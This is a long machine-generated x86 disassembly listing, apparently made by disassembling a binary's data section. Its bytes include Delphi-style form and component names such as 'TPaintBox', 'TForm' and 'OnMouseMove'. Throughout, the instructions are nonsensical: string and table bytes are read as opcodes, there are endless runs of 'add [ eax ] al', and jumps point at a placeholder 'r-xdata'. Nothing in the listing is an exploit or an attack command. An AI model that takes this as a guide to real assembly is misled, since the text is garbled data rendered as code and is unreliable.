mov es [ eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] al
js r-xdata
add [ eax ] al
sub al 0x1a
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
add [ eax ] 0x0
add [ eax ] al
sub al [ eax ]
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
sbb eax [ ebp ]
jl r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
imul ebp [ esi + 0x74 ] r-xdata
and [ edi - 0x705fffbc ] cl
inc esp
add [ ecx ] al
jo r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
daa
add [ ecx ] cl
push eax
outsb
je r-xdata
or [ edi + 0x6e ] ecx
jb r-xdata
jl r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
push edi
add [ eax ] al
push [ eax + 0x24 ]
add bh bh
or [ 0x10044 ] ah
add [ eax ] al
push eax
popad
jb r-xdata
push cs
je r-xdata
inc edi
je r-xdata
sub al 0x1a
inc ecx
add al al
add [ eax ] eax
outsb
inc ebp
outsb
inc esp
jb r-xdata
add [ eax ] al
add [ eax ] al
fld [ ebx ]
call 0xffffffffe9448209
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0033 ] al
outsb
call 0xffffffffb845c5ba
add [ eax ] eax
inc ebx
add al ch
add [ eax ] al
jo r-xdata
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
jl r-xdata
nop
xlat
inc ebx
add al ah
add [ eax ] al
jmp eax
imul esi [ ebp + 0x49 ] 0x906f666e
xlat
inc ebx
add al dl
add [ eax ] al
call eax
outsb
dec ebp
outsd
jne r-xdata
dec edi
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x4f090036 ] al
inc esp
jb r-xdata
mov al 0x1
add bh bh
add [ eax ] eax
sbb al [ ecx ]
sub [ ecx ] al
add bh bh
sub [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
mov al 0x1
add bh bh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jb r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax 0x61500a00
insb
inc esp
fiadd [ ebx ]
inc eax
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ eax ] dl
dec edi
outsb
inc esp
outsd
ja r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] eax
or eax 0x65476e4f
je r-xdata
sbb al [ ecx ]
enter 0x1 0xff
enter 0x1 0xff
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp [ eax ] al
push es
dec edi
outsb
inc ebp
js r-xdata
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
sbb al [ ecx ]
rol [ ecx ] 0x0
jo r-xdata
jb r-xdata
jo r-xdata
push ebx
je r-xdata
push edi
or al bl
inc ebx
add al bl
add [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
inc esp
jb r-xdata
or cl [ edi + 0x6e ]
fadd [ ebx ]
[ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0034 ] al
outsb
inc esp
jb r-xdata
fiadd [ ebx ]
sbb [ ecx ] al
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ ss : ecx ] cl
dec edi
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x24 ] bp
fiadd [ ebx ]
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax 0x6e4f0900
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
add [ eax + 0x4f0a0032 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
fiadd [ ebx ]
mov eax 0xb8ff0001
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsd
imul esp [ ebx + ebp ] 0x41
add [ ecx ] al
movsd [ edi ] [ esi ]
sbb eax 0x2bea1e43
out 0x4d eax
mov [ 0xfffffffffd45cc30 ] eax
jb r-xdata
inc esp
outsd
arpl [ ebx - 0x24 ] bp
fld [ ebx ]
adc [ ecx ] al
add bh bh
adc [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ ebx ] cl
dec edi
inc esp
fiadd [ ebx ]
dec eax
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ esi ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003a ] al
fadd [ ebx ]
rol [ ecx ] 0x1
add bh bh
rol [ ecx ] 0x1
add bh bh
add [ eax + 0x4f070037 ] al
add [ eax ] al
dec edi
jbe r-xdata
invd
dec ecx
insb
inc esi
add bh bh
dec [ ebx + 0x4584b4c0 ]
das
mov cl 0xec
add eax 0x6d726f46
jae r-xdata
add [ edi ] cl
or [ ecx + 0x4f ] cl
inc ebp
jb r-xdata
inc esp
jb r-xdata
push edi
push 0x556c6565
jo r-xdata
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
outsb
inc ebp
outsb
je r-xdata
insd
cmp al 0x11
inc eax
add [ ecx ] al
shl ecx 0x2
int 0xda
push edx
rcl [ ecx ] 0x1
sahf
cmpsb [ esi ] [ edi ]
add [ eax ] ah
scasd [ edi ]
cmp eax 0x4605da82
ficom [ edx - 0x30 ]
adc [ esi - 0x50dfff5a ] ebx
dec edi
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ecx
add [ ebx ] cl
dec edi
outsb
sbb al [ ecx ]
clc
add [ eax ] al
outsd
jb r-xdata
inc eax
add [ eax * 4 + 0xb030045 ] dh
push esp
inc edx
outsd
add [ ebx ] al
add [ eax ] al
add [ eax ] dh
test [ ebp ] eax
or al 0x62
imul edx [ ebx + 0x79 ] 0x6d657473
dec ebp
jae r-xdata
outsb
push ebx
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
inc ebx
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080043 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol [ eax + 0xf004584 ] 0xd
dec ecx
inc esp
jae r-xdata
push eax
outsd
jae r-xdata
jb r-xdata
or ah [ edx + 0x69 ]
dec ebp
bound ebp [ ecx + 0x4d ]
imul ebp [ esi + 0x69 ] 0x657a696d
dec [ ebp - 0x7b1bffc0 ]
inc ebp
add [ ebx ] al
or dl [ esi + eax * 2 + 0x6f ]
jb r-xdata
add bh bh
add [ eax ] eax
outsb
jb r-xdata
jo r-xdata
je r-xdata
inc edx
arpl [ edi + 0x6e ] bp
add [ eax ] eax
add [ eax ] al
dec edi
insd
imul edi [ edx + 0x65 ] 0x48696206
outsb
jne r-xdata
push ebx
je r-xdata
insb
jo r-xdata
push es
popad
insb
or ah [ esi + 0x73 ]
dec ebp
outsd
jb r-xdata
inc esi
inc esi
outsd
dec ebp
popad
imul ebp [ esi + 0x46 ] 0x436d726f
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ edi ] al
add [ eax ] al
add [ eax + 0xa004585 ] bl
jo r-xdata
push ebx
arpl [ edx + 0x65 ] si
outsb
inc ebx
outsb
je r-xdata
jb r-xdata
push cs
jo r-xdata
mov eax eax
test [ ebp + 0xc060045 ] al
push esp
inc esi
outsd
jb r-xdata
popad
js r-xdata
bound ebp [ ecx + 0x4d ]
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al ah
test [ ebp ] al
or [ esi + 0x73 ] ah
dec esi
outsd
jb r-xdata
insb
add [ gs : eax ] eax
insd
imul edi [ edx + 0x65 ] 0x4d69620a
inc esp
dec ecx
inc esi
outsd
jb r-xdata
push es
arpl [ ecx + 0x4e ] sp
add eax 0x6d726f46
jae r-xdata
jb r-xdata
jb r-xdata
jb r-xdata
inc esp
jae r-xdata
jo r-xdata
jb r-xdata
outsb
insb
jns r-xdata
arpl [ edi + 0x6e ] bp
jae r-xdata
outsd
add [ eax ] al
add eax [ eax ]
add [ eax ] al
xor al 0x86
inc esp
popa
jne r-xdata
insb
jns r-xdata
jae r-xdata
outsd
jb r-xdata
or esp [ esi + 0x73 ]
push ebx
je r-xdata
xchg [ ebp ] al
push es
inc eax
add [ edi + eax * 4 ] bl
outsb
je r-xdata
insd
inc ebx
xchg [ ebp ] al
add ecx [ ebx ]
add eax 0x6d726f46
jo r-xdata
jo r-xdata
arpl [ ecx + 0x6c ] sp
add [ gs : eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax + 0x6004586 ] cl
inc ebx
outsb
je r-xdata
inc esi
outsb
or [ fs : eax + 0x6f ] esi
inc esp
popa
jne r-xdata
or ah [ ebp + ebp * 2 + 0x4d ]
insd
push eax
adc [ eax + 0x6f ] dh
jo r-xdata
test [ ebp ] eax
nop
pushfd
test [ ebp ] eax
add ecx [ ecx ]
push esp
xor [ ebp - 0x636fffbb ] al
je r-xdata
je r-xdata
inc ebp
add [ ecx ] cl
insd
inc esp
jae r-xdata
add [ eax ] al
add [ esi + eax * 4 ] dh
je r-xdata
pshufw mm5 [ edi + 0x44 ] 0x65
jae r-xdata
jo r-xdata
inc esp
dec ecx
inc ebx
push 0x9646c69
jae r-xdata
rol [ ebp + eax * 4 + 0xc060045 ] 0x54
inc ebp
add [ esi ] al
or al 0x54
jns r-xdata
inc ebp
add [ eax ] cl
or edx [ ebx + eax * 2 + 0x6c ]
sbb al 0x87
dec esi
outsd
outsb
push cs
inc ebx
insb
outsd
inc ebp
jbe r-xdata
push es
arpl [ ecx + 0x46 ] sp
jb r-xdata
outsb
je r-xdata
popad
dec ebp
xchg [ ebp ] al
push esp
push eax
dec edi
ja r-xdata
jb r-xdata
push esp
cmp [ esi + 0xf030045 ] al
je r-xdata
nop
insd
popad
jb r-xdata
inc esp
jae r-xdata
inc esi
outsd
jb r-xdata
jae r-xdata
add ecx [ edi ]
imul edi [ edx + 0x65 ] 0x796c6e4f
je r-xdata
bound ebp [ ecx + 0x48 ]
outsb
push esp
outsd
jo r-xdata
outsd
inc ebx
insb
push eax
jb r-xdata
insd
popad
outsb
add al 0x57
outsd
jb r-xdata
pop es
inc edx
outsd
outsd
insb
popad
outsb
add [ ecx + edx ] bl
inc eax
add [ eax ] al
adc [ eax ] al
nop
movsb [ edi ] [ esi ]
xchg [ ebp ] eax
or [ esi ] cl
push esp
push ebx
push 0x4374726f
jne r-xdata
jae r-xdata
outsb
je r-xdata
push ecx
jne r-xdata
dec ebp
imul ebp [ esi + 0x69 ] 0x657a696d
add eax 0x6d726f46
jae r-xdata
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add al dl
xchg [ ebp ] al
jo r-xdata
push cs
je r-xdata
jb r-xdata
jb r-xdata
inc esi
outsd
jb r-xdata
adc [ eax + 0x6f ] esi
jo r-xdata
outsd
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
outsd
outsb
push es
arpl [ ecx + 0x48 ] sp
imul esp [ ebp + 0x6 ] 0x72466163
or ah [ gs : ebx + 0x61 ]
add [ eax ] al
add [ eax ] al
add eax [ eax ]
add [ eax ] al
rol [ esi + 0x63060045 ] 0x1
popad
dec esi
outsb
or al 0x54
inc ebx
insb
outsd
jae r-xdata
add [ esi ] eax
jb r-xdata
or [ ebp + ebp * 2 + 0x50 ] esp
aam 0x86
inc ebp
add [ ebx ] al
or al 0x54
inc ebx
insb
outsd
jae r-xdata
jb r-xdata
jo r-xdata
jb r-xdata
lea eax [ eax ]
xor al 0x85
inc ebp
add [ ebx ] al
or edx [ edx + eax * 2 + 0x6f ]
inc esi
outsd
jb r-xdata
jae r-xdata
jo r-xdata
sar [ eax + 0x45 ] 0x1
add [ esp + eax * 2 ] al
popad
je r-xdata
outsb
add [ eax ] dl
inc eax
add [ eax ] al
adc [ eax ] 0x40
add [ eax + edx + 0x40 ] dl
add [ eax ] al
adc [ eax ] al
lea eax [ eax ]
test [ eax + 0x45 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
js r-xdata
inc ebp
jbe r-xdata
add cl [ eax ]
push es
popad
outsb
add [ eax ] al
jb r-xdata
outsd
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x1
insd
outsd
add [ eax ] al
mov [ esi + 0x70060045 ] al
outsd
jae r-xdata
inc esp
popa
inc esp
popa
jne r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
add [ ecx + edx ] bl
inc eax
add al dl
xchg [ ebp ] al
lea eax [ eax ]
pushad
xchg [ ebp ] eax
or [ eax ] dl
push esp
inc ebx
insb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
or al 0x64
insd
add [ ebx ] al
add [ eax ] eax
add [ eax ] al
outsb
je r-xdata
jae r-xdata
jb r-xdata
adc [ eax ] al
adc [ eax ] eax
adc al [ ecx ]
sbb [ eax ] al
and al [ edx ]
sub [ eax ] al
adc [ edx ] eax
push ebx
add [ eax + eax ] ah
sbb al [ eax ]
inc esi
add [ eax - 0x50 ] al
aas
mov al 0x0
mov al 0x17
mov al 0x3c
mov al 0x1
mov al 0x5
mov al 0xd
mov al 0x10
mov al 0xe
mov al 0x15
mov al 0x19
mov al 0x1d
mov al 0x21
mov al 0x12
mov al 0x29
mov al 0x3d
mov al 0x8
mov al 0x44
mov al 0xb3
push [ edx - 0x13001201 ]
push [ ecx - 0x50004f01 ]
[ esi - 0x52000201 ]
add [ esp + edi * 8 + 0x45 ] cl
add [ eax ] dh
mov [ ebp ] 0xe
add [ eax ] al
add eax [ eax ]
add [ eax ] al
mov esp 0x3c004010
add al [ eax ]
add [ esp + eax * 4 + 0x45 ] bh
add [ eax + 0x2 ] dl
add [ eax ] al
mov al 0x84
inc ebp
add [ edx + eax ] ah
add [ 0x14000f00 ] bh
add [ edi ] ah
add [ edi ] dh
add [ ecx + 0x200a100 ] al
add [ ecx ] dl
add [ edi ] edx
add [ eax ] esp
add [ edi ] ebx
add [ esi ] eax
add [ eax ] dl
add [ ecx ] dl
add [ edx ] dl
add [ eax ] ebx
add [ edx ] ah
add ch [ eax ]
add [ ecx ] dl
add dl [ ebx ]
and al 0x0
add [ eax ] ah
movsd [ edi ] [ esi ]
inc ecx
add al dl
mov ecx 0xbb840045
inc ebp
add [ eax - 0xfffbfcb ] ah
pop es
dec ecx
outsb
je r-xdata
insb
inc ebp
add [ ebx + ecx * 4 ] bl
inc ebp
add [ eax ] al
add [ eax ] al
outsd
insb
popad
outsb
outsb
je r-xdata
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x6 ] si
outsd
jae r-xdata
inc ebp
add [ eax ] cl
or dl [ eax + ecx * 2 + 0x65 ]
insb
jo r-xdata
inc ebp
jbe r-xdata
jne r-xdata
popad
je r-xdata
outsd
outsd
imul ebp [ esi + 0x46 ] 0xc6d726f
insd
jb r-xdata
push ebx
outsb
jb r-xdata
or [ esi ] al
imul ebp [ edi + 0x6e ] 0x700c6c61
outsd
push eax
jb r-xdata
fild [ ebp ]
fdiv [ edx ]
inc eax
add al bh
xor al [ eax ]
in al dx
mov ebx 0x989c0045
inc esp
add [ ecx + eax * 8 + 0x45 ] bl
add [ ecx + ecx * 2 - 0x4253ffbf ] dh
inc ebp
add al ch
mov ebp 0xbef40045
inc ebp
add [ eax ] bh
and eax [ eax + eax + 0x38 ]
movsd [ edi ] [ esi ]
inc ecx
add [ edi + eax * 8 + 0x45 ] ch
add [ eax ] bl
mov [ 0x30c0041 ] al
test [ ebx + 0x35a00045 ] bh
inc eax
add al dh
jb r-xdata
inc esi
add [ eax + edi * 4 + 0x45 ] al
add [ eax - 0x33ffbb6d ] dh
cwde
inc esp
add [ eax ] bl
cwde
inc esp
add [ eax + ebx - 0x71d3ffbc ] dl
inc esp
add [ esp + eax * 8 + 0x45 ] cl
add [ ebx + ecx * 4 + 0x44 ] ah
add ah bl
pop ss
inc esp
add al ah
pop ss
inc esp
add [ eax - 0x3b ] al
inc ebp
add [ eax + ecx * 2 + 0x44 ] dl
add [ eax ] ah
and eax [ eax + eax + 0x58 ]
sbb [ eax + eax - 0x54 ] eax
and al 0x44
add [ edi + eax * 8 ] dh
inc ebp
add [ eax ] al
mov [ ebp ] 0xe4
and eax 0xc7ac0044
inc ebp
add al bl
dec eax
inc esp
add [ eax + 0x7400448b ] bh
mov [ eax + eax + 0x70 ] es
xchg [ eax + eax + 0x58 ] eax
mov [ eax + eax + 0x4c ] es
mov dh 0x45
add [ eax - 0x32 ] dl
inc ebp
add [ edx ] ah
inc esp
add [ ebx + ebx * 8 ] dl
inc ebp
add [ esi + ebx * 8 + 0x45 ] dh
add [ eax ] dh
fld [ ebp ]
mov esp 0xc0004462
bound eax [ eax + eax - 0x54 ]
fild [ ebp ]
and [ ecx + 0x44 ] ah
add [ eax - 0x5fffbb73 ] bl
out 0x45 al
add [ edi + ebx * 4 - 0x75ebffbc ] cl
inc esp
add [ ebx + edi * 8 - 0x4fbfffbb ] dh
inc ebp
add al dh
mov dl 0x45
add [ esp + ebp * 8 - 0x432fffbb ] dl
inc ebp
add [ ebp + edi * 4 + 0x45 ] cl
add [ edi + edi * 8 - 0x45f7ffbb ] dl
inc ebp
add [ eax + 0x780045fa ] bl
loope r-xdata
sbb [ edx + 0x30c0041 ] ah
add dl [ ecx ]
add ecx [ ebp + 0x73 ]
push es
push esp
push edi
dec ebp
dec ebx
jns r-xdata
push esp
adc [ eax ] al
add [ eax ] dl
inc eax
add [ ebp - 0x777bffc0 ] cl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x77 ] bh
jbe r-xdata
add [ eax ] al
add [ eax ] al
adc [ eax ] al
loopne r-xdata
outsb
je r-xdata
outsd
jae r-xdata
adc [ eax + 0x6f ] esi
outsb
je r-xdata
inc ebx
popad
insb
insb
dec eax
insb
jo r-xdata
or [ ebx + 0x61 ] al
dec eax
popad
outsb
insb
pop es
inc edx
pop es
add [ eax ] al
add [ eax ] al
add [ edx + 0xa004589 ] bl
mov eax [ ebp ]
clc
add al [ eax ]
add al dl
js r-xdata
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
xchg [ ebp ] eax
or [ ebx ] cl
push esp
outsd
inc esi
imul esi [ ebp + eax + 0x46 ] 0x736d726f
pop es
inc edx
outsd
outsd
insb
popad
inc edx
outsd
add [ edi ] al
inc ebx
outsd
insd
add eax [ eax ]
pop es
add [ eax ] ecx
inc ebx
popad
outsb
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ ecx + eax + 0x8 ] si
sub_458cc8
add bh bh
push esp
loopne r-xdata
push 0x1004604
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or al [ ecx + 0x6c ]
jo r-xdata
add ah dl
rol [ ebp ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
push cs
add [ 0x69746341 ] cl
jbe r-xdata
add [ eax ] al
adc eax [ eax ]
or al [ ecx + 0x75 ]
je r-xdata
popad
inc edx
insb
outsb
insb
adc [ eax ] al
loope r-xdata
add [ edi ] cl
inc ecx
insb
jo r-xdata
inc ebx
outsd
outsb
je r-xdata
outsd
outsb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
add [ eax ] dl
inc eax
add [ eax + eax ] bl
[ eax + eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
jl r-xdata
add bh bh
add [ eax ] al
adc al 0x0
popad
inc edx
insb
outsb
push esi
popad
insb
jne r-xdata
salc
outsd
insb
add al 0xcf
inc ebx
add [ ebx ] bl
add bh bh
sbb al [ fs : eax + eax + 0x1 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sldt [ 0x67696c41 ]
outsb
add [ eax ] dl
inc eax
add al ah
add al [ eax ]
[ eax + 0x4 ]
or [ ecx + 0x75 ] al
je r-xdata
add [ eax ] al
add [ eax + eax ] dl
jpe r-xdata
je r-xdata
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add dh bh
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax + 0xff ] al
adc [ eax ] eax
cmovno ebp [ eax + esi * 2 + 0x68 ]
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0x0
add [ eax ] al
outsd
inc ebx
add [ ecx ] ah
add bh bh
movsb [ edi ] [ esi ]
sbb [ eax + eax + 0x40 ] al
sbb [ eax + eax ] eax
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
adc al [ eax ]
pop es
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
sub al 0xd6
fmul st7
inc ebp
add ah dl
rol [ ebp ] cl
add [ eax ] al
add [ eax + 0x7 ] al
add [ eax ] dl
inc eax
add [ eax ] dl
add al [ eax ]
[ ecx + esi * 4 - 0x3c47ffbb ]
inc ebp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
push eax
and eax 0x25800044
inc esp
add ah dl
rol [ ebp ] cl
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb [ eax ] eax
pop es
inc ebx
add [ ecx ] ch
add al [ eax ]
dec [ eax ]
rol [ ebp ] 0x1
aam 0xd2
inc ebp
add [ eax ] al
add [ eax ] al
add [ edx ] 0x0
add [ eax ] al
pop ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
sub dh al
insb
movsb [ edi ] gs : [ esi ]
in al 0x43
add [ ecx + eax ] ch
jmp [ esi + ecx * 4 + 0x10044 ]
push ss
add [ ebx ] cl
inc edx
outsd
jb r-xdata
add [ eax ] al
add [ edi ] 0x0
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x42080015 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x8065646f
test [ ebp ] eax
sub [ edx ] al
add bh bh
popad
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070019 ] al
jb r-xdata
call 0xffffffffa5448ef2
add al 0x46
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax 0x72541000
popad
outsb
jae r-xdata
imul ebp [ edi + 0x6e ] r-xdata
cwde
pop ds
inc esp
insb
imul esp [ ebp + 0x6e ] 0x69654874
push 0x40105474
add [ edi + ebx + 0x44 ] dl
add [ eax ] ch
mov [ ebp ] 0x80
retn
add [ eax ] al
sbb [ edx ] 0x0
or al 0x43
jb r-xdata
popad
outsb
mov ah 0x41
add [ eax ] dh
add bh bh
jb r-xdata
jae r-xdata
arpl [ edi + 0x6e ] bp
add [ eax ] al
add [ eax + 0x1 ] al
popad
jb r-xdata
add [ eax - 0x3a ] bl
inc ebp
add [ eax + 0x45c3 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430c001a ] al
push ebp
jae r-xdata
popad
jb r-xdata
inc ebp
add [ eax + 0x45c3 ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001b ] al
insb
imul esp [ ebp + 0x6e ] 0x64695774
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi + 0x18ff0001 ] ah
nop
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
les ecx [ esi - 0x7117ffbc ]
inc esp
outsb
je r-xdata
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
xchg [ ebp ] al
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
aam 0xd2
inc ebp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
outsd
insb
outsd
jb r-xdata
add [ eax ] al
add [ eax ] eax
outsd
insb
outsd
jb r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
pushad
jns r-xdata
jb r-xdata
add [ eax ] al
jae r-xdata
mov ah 0x41
add ah ch
add al [ eax ]
call [ eax + 0x1004604 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ds
add [ 0x6e617254 ] dl
and [ eax ] eax
push cs
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
insb
jne r-xdata
aad 0x43
add [ ebp ] bl
add bh bh
pushad
outsd
outsb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax 0x72440800
popad
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
mov ch dl
inc ebx
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
add eax [ eax ]
add [ eax ] al
add [ ecx ] 0x0
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x3b00ffff ] ah
mov es [ eax + eax - 0x18 ]
mov es [ eax + eax ]
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
aam 0xd6
inc ebx
add [ eax + eax ] dh
push [ eax + 0x4a ]
inc esp
add [ ecx ] al
add [ eax ] al
sub_459a2c
mov edi 0xc8ffbdff
push es
inc esi
add al dh
push es
inc esi
add [ eax - 0x1fffb9f9 ] cl
pop es
inc esi
add [ eax + ecx + 0x8cc0046 ] dh
inc esi
add [ ebp + eax + 0x46 ] cl
add [ eax ] dh
push es
inc esi
add [ esi + eax + 0x540f0046 ] bl
inc ebx
jne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0045 ] bl
je r-xdata
add [ eax ] al
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax ] al
enter 0x4010 0x0
add [ eax ] al
add [ eax ] al
fwait
inc ebp
add [ eax + eax ] cl
push 0x700459a
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
add [ eax - 0x63ffbfcb ] bl
xor eax 0x35a00040
outsd
insd
inc esp
outsd
arpl [ ebx + 0x46 ] bp
outsd
jb r-xdata
add [ eax + r-xdata ] dl
push cs
or [ eax + ecx * 2 + 0x69 ] edx
outsb
je r-xdata
inc eax
add [ ebp + esi + 0x32dc0040 ] dl
inc eax
add al bh
inc eax
add [ ebp + esi + 0x35a00040 ] bl
sub [ ecx - 0x74e7ffbb ] bl
inc ebp
add [ esi ] cl
add [ 0x6d726f46 ] al
jae r-xdata
add [ eax ] al
add [ eax ] dl
inc eax
add [ eax + r-xdata ] dl
or [ edi ] cl
push esp
inc ebp
js r-xdata
outsb
outsw
inc eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + edx + 0x380040 ] bh
add [ eax ] al
nop
call 0x845e184
or eax 0x73654d54
jae r-xdata
